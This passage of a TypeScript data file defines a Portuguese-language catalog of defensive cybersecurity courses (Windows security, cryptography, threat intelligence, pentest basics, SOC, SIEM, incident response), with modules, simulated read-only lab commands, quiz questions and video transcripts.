import type { ExternalContentReference } from "./contentProvenance";

export type ActivatedCatalogCourse = {
  slug: string;
  code: string;
  title: string;
  shortTitle: string;
  description: string;
  level: "Iniciante" | "Intermediário" | "Avançado";
  duration: string;
  lessons: number;
  labs: number;
  quizCount: number;
  accent: "cyan" | "purple" | "green" | "blue";
  icon: "cpu" | "shield" | "network" | "terminal";
  focus: string;
  outcomes: readonly string[];
  modules: readonly { title: string; lessons: number; description: string }[];
  labsList: readonly { title: string; description: string; objective: string; command: string; output: string }[];
  assessment: string;
  externalResources?: readonly ExternalContentReference[];
  audioGuide?: {
    label: string;
    description: string;
    narration: string;
    duration: string;
    sourceUrl: string;
  };
  assessmentQuestions: readonly { id: string; prompt: string; options: readonly string[]; correctAnswer: number; explanation: string }[];
  videoLearning?: {
    provider: "YouTube";
    label: string;
    attribution: string;
    sourceUrl: string;
    embedUrl: string;
    sessions: readonly {
      moduleIndex: number;
      title: string;
      duration: string;
      focus: string;
      chapters: readonly { time: string; title: string; summary: string }[];
      transcript: readonly { time: string; text: string }[];
    }[];
  };
};

export const activatedCatalogCourses = [
  {
    slug: "windows-security", code: "WIN-01", title: "Windows Security", shortTitle: "Windows Security", level: "Iniciante", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "blue", icon: "cpu",
    description: "Contas, eventos, Defender e conceitos de Active Directory no ambiente Windows.", focus: "Higiene de identidades, telemetria de eventos e defesa de endpoints Windows.",
    outcomes: ["Aplicar princípios de menor privilégio a contas locais e corporativas.", "Ler eventos relevantes sem alterar o ambiente.", "Relacionar Defender, políticas e Active Directory a controles defensivos."],
    modules: [
      { title: "Contas e superfícies de acesso", lessons: 4, description: "Contas locais, grupos, UAC, privilégios e práticas de acesso responsável." },
      { title: "Eventos que contam uma história", lessons: 4, description: "Event Viewer, registros de segurança e contexto para investigação inicial." },
      { title: "Defesa e identidade corporativa", lessons: 4, description: "Microsoft Defender, noções de Active Directory e políticas de endpoint." },
    ],
    labsList: [
      { title: "Inventário de contas", description: "Revise contas e grupos de uma estação Windows simulada.", objective: "Identificar privilégios excessivos sem realizar mudanças no sistema.", command: "inspecionar-windows --contas --grupos --somente-leitura", output: "Contas locais: 4\nAdministradores: 2\nConta inativa: suporte-legado\nRecomendação: revisar necessidade e registrar aprovação" },
      { title: "Triagem de eventos", description: "Correlacione eventos de logon em uma linha do tempo de laboratório.", objective: "Separar comportamento esperado de um alerta que merece investigação.", command: "correlacionar-eventos --janela 4h --tipo logon", output: "Eventos analisados: 18\nFalhas de logon: 3\nOrigem repetida: estação-lab-07\nPróximo passo: preservar contexto e escalar para triagem" },
    ],
    assessment: "Avaliação de identidade, telemetria e controles de endpoint Windows.",
    assessmentQuestions: [
      { id: "win-1", prompt: "Qual prática reduz o risco de contas administrativas serem usadas indevidamente?", options: ["Menor privilégio", "Conta compartilhada", "UAC desativado", "Senha anotada"], correctAnswer: 0, explanation: "Menor privilégio limita o impacto de uma conta em caso de erro ou comprometimento." },
      { id: "win-2", prompt: "Para que serve o Event Viewer em uma investigação inicial?", options: ["Apagar registros", "Consultar eventos e seu contexto", "Criar usuários", "Desativar o Defender"], correctAnswer: 1, explanation: "O Event Viewer permite observar registros para contextualizar uma ocorrência." },
      { id: "win-3", prompt: "Qual controle ajuda a reduzir exposição de malware em endpoints?", options: ["Defender atualizado", "Logs desativados", "Conta administrador diária", "Compartilhar USBs"], correctAnswer: 0, explanation: "Proteção de endpoint atualizada é uma camada importante de defesa." },
      { id: "win-4", prompt: "No Active Directory, grupos ajudam principalmente a:", options: ["Aplicar permissões de forma consistente", "Eliminar backups", "Ocultar eventos", "Substituir MFA"], correctAnswer: 0, explanation: "Grupos facilitam a atribuição e a revisão consistente de acessos." },
      { id: "win-5", prompt: "Diante de falhas repetidas de logon, a primeira postura adequada é:", options: ["Preservar evidências e seguir triagem", "Excluir todos os logs", "Mudar todas as contas sem registro", "Ignorar o alerta"], correctAnswer: 0, explanation: "A triagem deve manter evidências e seguir o processo de resposta definido." },
    ],
  },
  {
    slug: "criptografia", code: "CRYPTO-01", title: "Criptografia", shortTitle: "Criptografia", level: "Iniciante", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "purple", icon: "shield",
    description: "Criptografia, hashes, certificados, PKI e TLS aplicados à proteção de dados.", focus: "Proteção de dados em trânsito e em repouso, integridade e confiança digital.",
    outcomes: ["Diferenciar criptografia, hash, assinatura e certificado.", "Explicar o papel de PKI e TLS em comunicações confiáveis.", "Selecionar controles proporcionais ao objetivo de confidencialidade e integridade."],
    modules: [
      { title: "Objetivos criptográficos", lessons: 4, description: "Confidencialidade, integridade, autenticidade e não repúdio em cenários cotidianos." },
      { title: "Hashes, chaves e assinaturas", lessons: 4, description: "Funções hash, pares de chaves, rotação e validação de integridade." },
      { title: "PKI e TLS em ação", lessons: 4, description: "Certificados, cadeia de confiança e comunicação protegida na web." },
    ],
    labsList: [
      { title: "Verificação de integridade", description: "Compare hashes de arquivos de exemplo em um ambiente seguro.", objective: "Identificar alteração de conteúdo sem manipular arquivos reais.", command: "validar-hash --arquivo relatorio.pdf --algoritmo sha256", output: "SHA-256 calculado: correspondente\nIntegridade: confirmada\nAlterações detectadas: nenhuma" },
      { title: "Cadeia de confiança TLS", description: "Inspecione uma cadeia de certificados simulada.", objective: "Reconhecer emissor, validade e propósito de um certificado.", command: "inspecionar-certificado --host portal.academy.local --tls", output: "Emissor: Academy Test CA\nValidade: vigente\nUso estendido: servidor TLS\nCadeia: confiável no laboratório" },
    ],
    assessment: "Avaliação de integridade, certificados, PKI e comunicação TLS.",
    assessmentQuestions: [
      { id: "crypto-1", prompt: "Qual propriedade um hash ajuda a verificar?", options: ["Integridade", "Disponibilidade", "Localização", "Velocidade da rede"], correctAnswer: 0, explanation: "Hashes permitem comparar o conteúdo esperado e identificar alterações." },
      { id: "crypto-2", prompt: "Para que serve um certificado digital em TLS?", options: ["Associar identidade a uma chave pública", "Apagar logs", "Substituir backups", "Criar senhas"], correctAnswer: 0, explanation: "Certificados apoiam a validação de identidade e da chave pública apresentada." },
      { id: "crypto-3", prompt: "Qual função uma assinatura digital oferece?", options: ["Integridade e autenticidade", "Compressão", "Segmentação", "Firewall"], correctAnswer: 0, explanation: "Assinaturas digitais permitem verificar autoria e integridade do conteúdo assinado." },
      { id: "crypto-4", prompt: "Em uma PKI, uma autoridade certificadora é responsável por:", options: ["Emitir e gerenciar certificados", "Executar malware", "Remover MFA", "Desligar serviços"], correctAnswer: 0, explanation: "A CA participa da emissão e do ciclo de confiança dos certificados." },
      { id: "crypto-5", prompt: "TLS protege principalmente:", options: ["Dados em trânsito", "Apenas dados apagados", "Apenas arquivos locais", "Apenas senhas impressas"], correctAnswer: 0, explanation: "TLS cria um canal protegido para comunicações em rede." },
    ],
  },
  {
    slug: "threat-intelligence", code: "TI-01", title: "Threat Intelligence", shortTitle: "Threat Intelligence", level: "Iniciante", duration: "12 horas", lessons: 11, labs: 2, quizCount: 5, accent: "green", icon: "network",
    description: "IOCs, TTPs, OSINT e fontes de inteligência para enriquecer a defesa.", focus: "Transformação de dados abertos e indicadores em contexto defensivo acionável.",
    outcomes: ["Diferenciar dados, indicadores e inteligência aplicada.", "Relacionar TTPs a hipóteses de detecção defensiva.", "Avaliar fontes abertas com cuidado de contexto e confiabilidade."],
    modules: [
      { title: "Do sinal ao contexto", lessons: 4, description: "Ciclo de inteligência, requisitos, coleta e análise com finalidade defensiva." },
      { title: "IOCs e TTPs", lessons: 4, description: "Indicadores observáveis, comportamento adversário e mapeamento responsável." },
      { title: "OSINT para defesa", lessons: 3, description: "Fontes abertas, credibilidade, ética e produção de briefings." },
    ],
    labsList: [
      { title: "Enriquecimento de IOC", description: "Classifique indicadores fictícios e atribua contexto de risco.", objective: "Priorizar o que merece monitoramento sem tratar um indicador isolado como certeza.", command: "enriquecer-ioc --amostra feed-treino.json --contexto defensivo", output: "Indicadores: 6\nConfiança alta: 2\nContexto insuficiente: 3\nAção: monitorar e correlacionar com telemetria interna" },
      { title: "Briefing de TTP", description: "Relacione um comportamento simulado a uma hipótese de detecção.", objective: "Converter uma observação em pergunta defensiva verificável.", command: "mapear-ttp --cenario acesso-incomum --matriz mitre", output: "Hipótese: uso indevido de credencial\nFonte de validação: logs de autenticação\nRecomendação: correlacionar horário, origem e privilégio" },
    ],
    assessment: "Avaliação de contexto, indicadores, TTPs e uso defensivo de fontes abertas.",
    assessmentQuestions: [
      { id: "ti-1", prompt: "Um IOC deve ser interpretado como:", options: ["Um sinal que precisa de contexto", "Prova absoluta isolada", "Uma senha", "Um backup"], correctAnswer: 0, explanation: "Indicadores precisam ser correlacionados com outros dados antes de uma conclusão." },
      { id: "ti-2", prompt: "TTPs descrevem principalmente:", options: ["Comportamentos e padrões de atuação", "Somente endereços IP", "Arquivos de backup", "Tipos de hardware"], correctAnswer: 0, explanation: "TTPs ajudam a compreender comportamentos, técnicas e procedimentos observados." },
      { id: "ti-3", prompt: "Uma boa fonte OSINT deve ser avaliada por:", options: ["Confiabilidade e contexto", "Quantidade de anúncios", "Cor do site", "Tamanho da senha"], correctAnswer: 0, explanation: "A qualidade da fonte e o contexto são essenciais para uma análise responsável." },
      { id: "ti-4", prompt: "Qual é o objetivo de uma hipótese de detecção?", options: ["Orientar o que observar e validar", "Eliminar logs", "Substituir investigação", "Desativar alertas"], correctAnswer: 0, explanation: "Hipóteses orientam a coleta e a validação de sinais relevantes." },
      { id: "ti-5", prompt: "O ciclo de inteligência começa pela:", options: ["Definição de requisitos", "Publicação de um alerta", "Exclusão de evidências", "Alteração de produção"], correctAnswer: 0, explanation: "Requisitos claros definem que perguntas a inteligência deve responder." },
    ],
  },
  {
    slug: "fundamentos-pentest", code: "PT-01", title: "Fundamentos de Pentest", shortTitle: "Fundamentos de Pentest", level: "Intermediário", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "purple", icon: "terminal",
    description: "Reconhecimento, enumeração e validação responsável de vulnerabilidades em laboratório.", focus: "Metodologia, autorização, registro de evidências e comunicação defensiva em ambientes controlados.",
    outcomes: ["Definir escopo e regras de engajamento responsáveis.", "Distinguir reconhecimento, enumeração e validação em laboratório.", "Produzir achados claros, reproduzíveis e úteis para correção."],
    modules: [
      { title: "Ética, autorização e escopo", lessons: 4, description: "Consentimento, limites, ativos autorizados e regras de engajamento." },
      { title: "Descoberta em laboratório", lessons: 4, description: "Reconhecimento passivo, inventário e enumeração não destrutiva." },
      { title: "Achados e comunicação", lessons: 4, description: "Validação controlada, evidências, impacto e recomendações de correção." },
    ],
    labsList: [
      { title: "Revisão de escopo", description: "Valide os limites de uma missão simulada antes de qualquer prática.", objective: "Confirmar autorização, ativos permitidos e janela de laboratório.", command: "validar-escopo --ambiente lab-cyber --autorizacao registrada", output: "Ambiente: laboratório isolado\nAtivos permitidos: 3\nJanela: ativa\nRegra: nenhuma ação fora do escopo" },
      { title: "Inventário de serviço", description: "Interprete uma lista pré-coletada de serviços do laboratório.", objective: "Organizar evidências sem realizar exploração ou alteração.", command: "revisar-inventario --arquivo servicos-lab.json --somente-leitura", output: "Serviços inventariados: 4\nVersões a revisar: 2\nAção: documentar risco e priorizar correção" },
    ],
    assessment: "Avaliação de escopo, práticas seguras de laboratório e comunicação de achados.",
    assessmentQuestions: [
      { id: "pt-1", prompt: "Antes de um teste de segurança, o item essencial é:", options: ["Autorização e escopo definidos", "Uma lista de senhas", "Desativar logs", "Acesso irrestrito"], correctAnswer: 0, explanation: "Autorização e regras de engajamento protegem pessoas, sistemas e o próprio processo." },
      { id: "pt-2", prompt: "Enumeração responsável busca principalmente:", options: ["Entender ativos e serviços autorizados", "Alterar produção", "Apagar evidências", "Evitar documentação"], correctAnswer: 0, explanation: "A enumeração em ambiente autorizado identifica informações úteis para avaliação controlada." },
      { id: "pt-3", prompt: "Um achado de qualidade deve conter:", options: ["Evidência, impacto e recomendação", "Apenas opinião", "Dados ocultos", "Credenciais reais"], correctAnswer: 0, explanation: "Um relatório útil possibilita compreender e corrigir o risco identificado." },
      { id: "pt-4", prompt: "Qual postura é apropriada ao encontrar algo fora do escopo?", options: ["Parar e comunicar", "Continuar sem registrar", "Publicar detalhes", "Desativar o sistema"], correctAnswer: 0, explanation: "Atividades fora do escopo devem ser interrompidas e escaladas conforme as regras." },
      { id: "pt-5", prompt: "Um laboratório isolado existe para:", options: ["Praticar sem afetar infraestrutura real", "Acessar sistemas externos", "Remover controles", "Distribuir ferramentas"], correctAnswer: 0, explanation: "O isolamento permite aprendizagem controlada e reduz riscos operacionais." },
    ],
  },
  {
    slug: "soc-analyst", code: "SOC-01", title: "SOC Analyst", shortTitle: "SOC Analyst", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 3, quizCount: 5, accent: "cyan", icon: "shield",
    description: "Alertas, triagem, playbooks e escalonamento para começar em um SOC.", focus: "Rotina de triagem, priorização de alertas, documentação e decisão de escalonamento.",
    outcomes: ["Classificar alertas por contexto, impacto e urgência.", "Usar playbooks para orientar uma triagem consistente.", "Registrar evidências e escalar com informações acionáveis."],
    modules: [
      { title: "Operação de um SOC", lessons: 4, description: "Papéis, filas de alertas, SLAs e comunicação entre turnos." },
      { title: "Triagem com contexto", lessons: 5, description: "Validação inicial, enriquecimento, priorização e falsos positivos." },
      { title: "Playbooks e escalonamento", lessons: 5, description: "Passos repetíveis, preservação de evidências e passagem de caso." },
    ],
    labsList: [
      { title: "Classificação de alerta", description: "Aplique critérios de prioridade a um alerta de autenticação simulado.", objective: "Registrar uma decisão de triagem com justificativa e próximos passos.", command: "triar-alerta --tipo login-incomum --playbook autenticacao", output: "Severidade inicial: média\nContexto: origem nova e MFA aprovado\nAção: enriquecer com histórico e manter monitoramento" },
      { title: "Passagem de caso", description: "Prepare um resumo para escalonamento de incidente.", objective: "Comunicar fatos, evidências e hipótese sem especulação excessiva.", command: "escalonar-caso --id SOC-LAB-17 --evidencias preservadas", output: "Caso registrado: SOC-LAB-17\nEvidências: logs e linha do tempo\nHipótese: acesso anômalo requer validação\nDestino: analista N2" },
      { title: "Triagem de logs de autenticação", description: "Analise eventos fictícios de login para separar sinais relevantes de atividade esperada.", objective: "Relacionar horário, origem, MFA e contexto do dispositivo antes de priorizar um alerta.", command: "analisar-logs --fonte autenticacao --cenario soc-treino --correlacionar origem,mfa,dispositivo", output: "Eventos analisados: 12\nSinal relevante: origem inédita fora do horário habitual\nContexto: MFA aprovado e dispositivo conhecido\nDecisão: manter monitoramento e registrar hipótese" },
    ],
    assessment: "Avaliação de triagem, playbooks, escalonamento e documentação de alerta.",
    assessmentQuestions: [
      { id: "soc-1", prompt: "Qual é o objetivo inicial da triagem de alerta?", options: ["Determinar contexto e prioridade", "Apagar o alerta", "Emitir certificado", "Trocar todos os sistemas"], correctAnswer: 0, explanation: "Triagem identifica o que ocorreu, sua relevância e a ação mais adequada." },
      { id: "soc-2", prompt: "Um playbook ajuda a equipe porque:", options: ["Padroniza decisões e registros", "Elimina a necessidade de análise", "Substitui logs", "Oculta incidentes"], correctAnswer: 0, explanation: "Playbooks tornam etapas repetitivas mais consistentes e auditáveis." },
      { id: "soc-3", prompt: "Ao escalar um caso, inclua:", options: ["Fatos, evidências e hipótese", "Somente uma opinião", "Credenciais", "Logs apagados"], correctAnswer: 0, explanation: "Um bom escalonamento permite continuidade com base em informações verificáveis." },
      { id: "soc-4", prompt: "Um falso positivo é:", options: ["Alerta sem atividade maliciosa confirmada", "Incidente crítico confirmado", "Certificado vencido", "Backup inválido"], correctAnswer: 0, explanation: "Falsos positivos são alertas que não representam a condição de segurança inicialmente suspeita." },
      { id: "soc-5", prompt: "Preservar evidências durante triagem é importante para:", options: ["Permitir investigação e auditoria", "Acelerar exclusão de logs", "Ocultar falhas", "Ignorar o caso"], correctAnswer: 0, explanation: "Evidências preservadas suportam decisões e análises posteriores." },
    ],
    videoLearning: {
      provider: "YouTube", label: "Trilha SOC em vídeo: Fundamentos de Operação", attribution: "Playlist pública externa sobre a função de SOC Analyst incorporada como material complementar. Os capítulos, transcrições de apoio, laboratórios e avaliações são autorais da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/playlist?list=PLHGcMOogAnre0zfLBIhpq1fHvLxABGtuD", embedUrl: "https://www.youtube-nocookie.com/embed/videoseries?list=PLHGcMOogAnre0zfLBIhpq1fHvLxABGtuD&rel=0",
      sessions: [
        { moduleIndex: 0, title: "A operação do SOC", duration: "≈ 18 min", focus: "Relacionar papéis, filas, SLAs e responsabilidade de turno a uma operação defensiva sustentável.", chapters: [{ time: "00:00", title: "Missão do SOC", summary: "Compreenda como visibilidade e priorização apoiam a defesa contínua." }, { time: "06:00", title: "Fila com contexto", summary: "Diferencie volume de alertas de risco real para a organização." }, { time: "13:00", title: "Passagem de turno", summary: "Registre estado, fatos e pendências para manter a continuidade." }], transcript: [{ time: "00:00", text: "Um SOC organiza pessoas, processos e telemetria para observar sinais e responder de maneira proporcional ao risco." }, { time: "06:00", text: "Alertas não têm todos a mesma prioridade; ativo, identidade, horário e impacto ajudam a construir contexto antes de decidir." }, { time: "13:00", text: "Uma boa passagem de turno preserva o que foi observado, o que já foi validado e qual é a próxima ação segura." }] },
        { moduleIndex: 1, title: "Triagem responsável", duration: "≈ 20 min", focus: "Aplicar observação, enriquecimento e hipótese sem transformar um alerta em conclusão prematura.", chapters: [{ time: "00:00", title: "Sinal não é incidente", summary: "Use o alerta como início da investigação, não como veredito." }, { time: "07:00", title: "Enriquecimento", summary: "Conecte identidade, ativo, origem e histórico de forma proporcional." }, { time: "14:00", title: "Decisão documentada", summary: "Registre prioridade, evidência e o porquê da próxima ação." }], transcript: [{ time: "00:00", text: "A triagem começa ao delimitar o sinal observado e a pergunta que precisa ser respondida com evidências." }, { time: "07:00", text: "Enriquecer não significa coletar tudo: selecione fontes que possam confirmar ou enfraquecer a hipótese de forma responsável." }, { time: "14:00", text: "Uma decisão de triagem de qualidade deixa claro o contexto usado, a incerteza restante e quem deve acompanhar o caso." }] },
        { moduleIndex: 2, title: "Playbook e escalonamento", duration: "≈ 18 min", focus: "Transformar uma investigação inicial em uma passagem de caso útil e auditável.", chapters: [{ time: "00:00", title: "Etapas repetíveis", summary: "Use playbooks como guia, preservando análise e contexto." }, { time: "06:00", title: "Evidência preservada", summary: "Mantenha registros que permitam revisão e continuidade." }, { time: "12:00", title: "Escalonar com clareza", summary: "Comunique fatos, impacto possível, hipótese e pedido de apoio." }], transcript: [{ time: "00:00", text: "Playbooks reduzem variação em tarefas repetitivas, mas não dispensam a análise humana do cenário e do impacto." }, { time: "06:00", text: "Evidências devem ser registradas com origem e horário para que outra pessoa possa reproduzir o raciocínio adotado." }, { time: "12:00", text: "Escalonar bem é entregar contexto acionável: o que ocorreu, o que foi validado, o que permanece incerto e qual decisão é necessária." }] },
      ],
    },
  },
  {
    slug: "siem-na-pratica", code: "SIEM-01", title: "SIEM na Prática", shortTitle: "SIEM na Prática", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "cyan", icon: "network",
    description: "Coleta, normalização, correlação e investigação de logs em cenários guiados.", focus: "Construção de visibilidade com logs úteis, correlação responsável e investigação orientada a evidências.",
    outcomes: ["Identificar fontes de log relevantes para uma hipótese de detecção.", "Explicar normalização e correlação de eventos.", "Interpretar um alerta sem confundir correlação com confirmação."],
    modules: [
      { title: "Fundamentos de telemetria", lessons: 4, description: "Fontes de eventos, qualidade de logs, horários e retenção." },
      { title: "Normalização e correlação", lessons: 5, description: "Campos comuns, contexto e regras que conectam sinais relacionados." },
      { title: "Investigação guiada", lessons: 5, description: "Linha do tempo, validação de hipóteses e documentação de conclusões." },
    ],
    labsList: [
      { title: "Fontes de evento", description: "Monte uma lista de telemetria para um cenário de acesso remoto.", objective: "Selecionar evidências suficientes para investigar uma hipótese.", command: "mapear-logs --cenario acesso-remoto --fontes identidade,endpoint,rede", output: "Fontes selecionadas: identidade, endpoint, rede\nCobertura: autenticação e origem\nLacuna: contexto de dispositivo" },
      { title: "Correlação de sinais", description: "Interprete uma regra de correlação em dados fictícios.", objective: "Reconhecer que correlação cria uma hipótese, não uma conclusão automática.", command: "correlacionar-logs --regra logon+origem-nova --ambiente treino", output: "Sinais correlacionados: 2\nPrioridade: investigar\nConclusão: coletar contexto adicional antes de classificar incidente" },
    ],
    assessment: "Avaliação de fontes de log, normalização, correlação e investigação.",
    assessmentQuestions: [
      { id: "siem-1", prompt: "A normalização de logs busca:", options: ["Organizar dados em campos comparáveis", "Excluir eventos", "Criar malware", "Desativar retenção"], correctAnswer: 0, explanation: "Campos normalizados facilitam busca e correlação entre fontes distintas." },
      { id: "siem-2", prompt: "Uma correlação de eventos representa:", options: ["Uma hipótese para investigar", "Confirmação automática de incidente", "Um backup", "Uma senha"], correctAnswer: 0, explanation: "Regras de correlação indicam sinais relacionados que ainda requerem análise." },
      { id: "siem-3", prompt: "Qual dado auxilia uma linha do tempo?", options: ["Timestamps consistentes", "Logs apagados", "Conexões sem registro", "Opiniões"], correctAnswer: 0, explanation: "Horários consistentes são essenciais para ordenar e comparar eventos." },
      { id: "siem-4", prompt: "Para investigar acesso remoto, uma fonte relevante é:", options: ["Logs de autenticação", "Papel de parede", "Cor do monitor", "Arquivo temporário sem contexto"], correctAnswer: 0, explanation: "Eventos de autenticação ajudam a entender quem acessou, quando e de onde." },
      { id: "siem-5", prompt: "Retenção de logs é importante porque:", options: ["Permite consultas e investigações posteriores", "Substitui MFA", "Elimina alertas", "Aumenta privilégios"], correctAnswer: 0, explanation: "Registros mantidos por período adequado apoiam análise, auditoria e resposta." },
    ],
    videoLearning: {
      provider: "YouTube", label: "Trilha SOC em vídeo: SIEM e análise de logs", attribution: "Vídeo público externo sobre SIEM e análise de logs incorporado como apoio complementar. A organização didática, cenários, transcrições e avaliações são autorais da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/watch?v=EHV45MPB-OQ", embedUrl: "https://www.youtube-nocookie.com/embed/EHV45MPB-OQ?rel=0",
      sessions: [
        { moduleIndex: 0, title: "Telemetria que explica", duration: "≈ 17 min", focus: "Reconhecer fontes, campos e lacunas de observabilidade antes de depender de uma ferramenta.", chapters: [{ time: "00:00", title: "Pergunta de investigação", summary: "Defina que comportamento precisa ser observado." }, { time: "05:00", title: "Fontes relevantes", summary: "Conecte identidade, endpoint e rede à hipótese." }, { time: "12:00", title: "Qualidade do evento", summary: "Avalie horário, completude e retenção dos registros." }], transcript: [{ time: "00:00", text: "A utilidade de um log depende da pergunta de segurança que ele pode ajudar a responder e do contexto que acompanha o evento." }, { time: "05:00", text: "Fontes diferentes descrevem partes diferentes do mesmo comportamento; combinar contexto reduz interpretações isoladas e frágeis." }, { time: "12:00", text: "Campos consistentes, horários sincronizados e retenção adequada fazem parte da qualidade mínima para uma investigação confiável." }] },
        { moduleIndex: 1, title: "Correlação como hipótese", duration: "≈ 18 min", focus: "Usar regras de correlação para priorizar investigação, sem confundir sinal com confirmação.", chapters: [{ time: "00:00", title: "Normalizar para comparar", summary: "Organize campos comuns antes de combinar eventos." }, { time: "06:00", title: "Regra de correlação", summary: "Entenda o comportamento que a regra procura observar." }, { time: "13:00", title: "Contexto antes da conclusão", summary: "Colete dados adicionais antes de classificar um incidente." }], transcript: [{ time: "00:00", text: "Normalização permite que eventos de fontes distintas sejam pesquisados e comparados por campos que mantêm o mesmo significado." }, { time: "06:00", text: "Uma regra de correlação relaciona sinais de interesse; ela ajuda a priorizar, mas não substitui a verificação humana." }, { time: "13:00", text: "O analista deve buscar contexto do ativo, da identidade e do período para decidir se o sinal é esperado, suspeito ou inconclusivo." }] },
        { moduleIndex: 2, title: "Linha do tempo defensiva", duration: "≈ 17 min", focus: "Montar uma narrativa de eventos verificável e registrar limites da conclusão.", chapters: [{ time: "00:00", title: "Ordenar os eventos", summary: "Construa a linha do tempo a partir de timestamps confiáveis." }, { time: "06:00", title: "Separar fato e inferência", summary: "Identifique o que o dado mostra e o que ainda precisa de validação." }, { time: "12:00", title: "Fechar com evidência", summary: "Documente conclusão, confiança e próximos passos." }], transcript: [{ time: "00:00", text: "Uma linha do tempo começa pelo ordenamento de eventos com horários comparáveis e identificadores que permitem retorno à fonte original." }, { time: "06:00", text: "Fatos observáveis e inferências devem aparecer separados para que a equipe saiba qual parte exige confirmação adicional." }, { time: "12:00", text: "O encerramento de uma investigação precisa registrar evidências usadas, grau de confiança e ações que ainda precisam de acompanhamento." }] },
      ],
    },
  },
  {
    slug: "incident-response", code: "IR-01", title: "Incident Response", shortTitle: "Incident Response", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "green", icon: "shield",
    description: "Preparação, contenção, erradicação e lições aprendidas em incidentes simulados.", focus: "Resposta estruturada que preserva evidências, limita impacto e transforma incidentes em melhoria.",
    outcomes: ["Reconhecer fases essenciais de resposta a incidentes.", "Priorizar contenção sem destruir evidências.", "Produzir registro de lições aprendidas e ações de melhoria."],
    modules: [
      { title: "Preparação e detecção", lessons: 4, description: "Papéis, canais, inventário, playbooks e confirmação de ocorrência." },
      { title: "Contenção e erradicação", lessons: 5, description: "Limitação de impacto, preservação de dados e remoção de causa raiz." },
      { title: "Recuperação e aprendizado", lessons: 5, description: "Retorno seguro, comunicação, análise pós-incidente e melhorias." },
    ],
    labsList: [
      { title: "Plano de contenção", description: "Organize ações iniciais para uma conta simulada comprometida.", objective: "Conter impacto sem apagar evidências de autenticação.", command: "planejar-contencao --cenario conta-comprometida --preservar-evidencias", output: "1. Preservar logs\n2. Revogar sessões ativas\n3. Exigir redefinição de credencial\n4. Notificar responsável pelo incidente" },
      { title: "Lições aprendidas", description: "Registre melhoria após um incidente de laboratório.", objective: "Converter o que foi observado em ação verificável de prevenção.", command: "registrar-licoes --incidente IR-LAB-08 --acao mfa-contextual", output: "Causa contribuinte: validação insuficiente\nAção: reforçar MFA contextual\nDono: equipe de identidade\nRevisão: 30 dias" },
    ],
    assessment: "Avaliação das fases de resposta, preservação de evidências e melhoria contínua.",
    assessmentQuestions: [
      { id: "ir-1", prompt: "Durante contenção, uma boa prática é:", options: ["Preservar evidências antes de ações irreversíveis", "Apagar todos os logs", "Ignorar comunicação", "Publicar dados"], correctAnswer: 0, explanation: "Evidências preservadas permitem análise confiável e apoiam decisões posteriores." },
      { id: "ir-2", prompt: "Erradicação busca principalmente:", options: ["Remover a causa e os artefatos do incidente", "Ocultar o caso", "Desligar auditoria", "Emitir certificado"], correctAnswer: 0, explanation: "Após conter o impacto, a causa e os artefatos relacionados precisam ser tratados." },
      { id: "ir-3", prompt: "Lições aprendidas servem para:", options: ["Melhorar controles e processos", "Culpar indivíduos", "Excluir relatórios", "Evitar documentação"], correctAnswer: 0, explanation: "O objetivo é reduzir recorrência e melhorar a preparação organizacional." },
      { id: "ir-4", prompt: "Qual é um resultado de recuperação bem executada?", options: ["Retorno controlado com monitoramento", "Retorno sem validação", "Logs removidos", "Contas compartilhadas"], correctAnswer: 0, explanation: "A recuperação deve validar o retorno e manter observação para detectar recaídas." },
      { id: "ir-5", prompt: "Um playbook de incidente fornece:", options: ["Etapas repetíveis para a resposta", "Exploits automáticos", "Credenciais", "Substituição de equipes"], correctAnswer: 0, explanation: "Playbooks estabelecem ações e responsabilidades para cenários recorrentes." },
    ],
    videoLearning: {
      provider: "YouTube", label: "Trilha SOC em vídeo: Resposta a incidentes", attribution: "Conversa pública externa sobre SOC e resposta a incidentes incorporada como complemento. As práticas, estrutura de estudo, transcrições de apoio e avaliações são autorais da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/watch?v=mPKRESgwLCw", embedUrl: "https://www.youtube-nocookie.com/embed/mPKRESgwLCw?rel=0",
      sessions: [
        { moduleIndex: 0, title: "Preparar antes do alerta", duration: "≈ 16 min", focus: "Relacionar papéis, comunicação, inventário e playbooks à capacidade de resposta.", chapters: [{ time: "00:00", title: "Preparação operacional", summary: "Defina papéis, contatos e critérios de acionamento." }, { time: "05:00", title: "Detecção com contexto", summary: "Transforme sinais em perguntas investigáveis." }, { time: "11:00", title: "Evidências iniciais", summary: "Preserve os dados que sustentam decisões posteriores." }], transcript: [{ time: "00:00", text: "Preparação reduz improviso: equipes precisam conhecer responsabilidades, canais de comunicação e recursos disponíveis antes de uma ocorrência." }, { time: "05:00", text: "Detectar é observar um sinal; a investigação começa ao delimitar o contexto, o ativo envolvido e o risco que precisa ser avaliado." }, { time: "11:00", text: "Evidências iniciais devem ser preservadas de maneira organizada para que decisões e hipóteses possam ser revistas ao longo do caso." }] },
        { moduleIndex: 1, title: "Conter com responsabilidade", duration: "≈ 18 min", focus: "Priorizar ações reversíveis, coordenadas e justificadas em cenários simulados.", chapters: [{ time: "00:00", title: "Limitar o impacto", summary: "Entenda escopo e dependências antes de mudar um recurso." }, { time: "06:00", title: "Preservar e comunicar", summary: "Evite ações que destruam contexto ou surpreendam partes afetadas." }, { time: "13:00", title: "Tratar a causa", summary: "Planeje erradicação com validação e registro." }], transcript: [{ time: "00:00", text: "Contenção busca reduzir impacto sem criar um problema maior; por isso o escopo e os efeitos operacionais devem ser avaliados antes da mudança." }, { time: "06:00", text: "Preservar evidências e manter comunicação coordenada evita que ações isoladas comprometam a investigação ou a continuidade do negócio." }, { time: "13:00", text: "Erradicação trata causas e artefatos relevantes, mas precisa ser acompanhada de validação para evitar uma falsa sensação de encerramento." }] },
